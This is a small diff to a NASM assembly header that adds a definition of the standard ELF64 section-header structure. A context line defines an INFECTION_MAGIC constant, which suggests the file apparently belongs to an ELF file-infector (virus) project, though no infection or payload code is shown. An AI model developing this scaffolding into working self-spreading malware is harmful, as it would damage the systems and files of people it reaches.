@@ -87,6 +87,19 @@ endstruc
 %define PF_W            (1 << 1)
 %define PF_R            (1 << 2)
 
+struc       Elf64_Shdr
+    sh_name:        resd    1
+    sh_type:        resd    1
+    sh_flags:       resq    1
+    sh_addr:        resq    1
+    sh_offset:      resq    1
+    sh_size:        resq    1
+    sh_link:        resd    1
+    sh_info:        resd    1
+    sh_addralign:   resq    1
+    sh_entsize:     resq    1
+endstruc
+
 %define INFECTION_MAGIC 0xcafefeed
 
 %endif
